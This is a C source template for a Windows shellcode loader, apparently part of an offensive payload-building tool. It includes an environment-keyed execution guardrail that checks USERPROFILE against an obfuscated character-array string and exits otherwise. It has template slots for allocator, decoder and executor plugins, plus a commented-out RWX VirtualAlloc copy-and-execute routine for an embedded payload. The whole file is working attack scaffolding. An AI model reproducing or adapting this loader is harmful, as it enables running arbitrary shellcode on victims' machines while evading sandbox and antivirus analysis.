#include <Windows.h>

char *supermega_payload;

int main()
{
	// Execution Guardrail: Env Check
	wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
	wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
	DWORD result = ((DWORD(WINAPI*)(LPCWSTR, LPWSTR, DWORD))GetEnvironmentVariableW)(envVarName, buffer, 1024);
	if (result == 0) {
		return 6;
	}
	if (mystrcmp(buffer, tocheck) != 0) { 
		return 6;
	}


    // char *dest = ...
    {{ plugin_allocator }}

    // dest[] = supermega_payload[]
    // len: 0x11223344
    {{ plugin_decoder }}

    // dest[]
    {{ plugin_executor }}

    /*

	// Copy shellcode
	// ntdll.dll: VirtualAlloc()
	char *dest = VirtualAlloc(NULL, 4096, 0x3000, 0x40);
	// 11223344 is a magic number which will be replaced in the asm source
	// with the payload length.
	for(int n=0; n<11223344; n++) {
		dest[n] = supermega_payload[n];
	}

	// Exec shellcode
	 (*(void(*)())(dest))();
*/
	return 0;
}

int mystrcmp(wchar_t* str1, wchar_t* str2) {
	int i = 0;
	while (str1[i] != L'\0' && str2[i] != L'\0') {
		if (str1[i] != str2[i]) {
			return 1;
		}
		i++;
	}
	return 0;
}